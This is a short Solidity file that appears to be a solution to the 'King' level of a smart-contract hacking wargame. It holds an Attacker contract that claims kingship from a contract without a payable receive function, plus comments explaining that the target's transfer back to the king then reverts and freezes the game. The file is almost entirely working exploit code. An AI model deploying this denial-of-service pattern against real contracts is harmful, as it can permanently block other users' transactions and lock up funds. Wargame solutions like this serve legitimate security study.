//////////////////////////////////////
// Level 9 - King
// By: Lorenzo Cesconetto
//////////////////////////////////////

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

// SOLUTION:
// Just need to claim ownership with a contract that won't accept ether through .transfer()
// by not declaring a payable receive function.
// Then this code: payable(king).transfer(msg.value); will fail and revert the transaction.
// You may need to manually set the gas limit up.
contract Attacker {
    address target;

    constructor(address _target) {
        target = _target;
    }

    function claimKingship() external payable returns (bool) {
        (bool success, ) = target.call{value: msg.value}("");
        return success;
    }
}
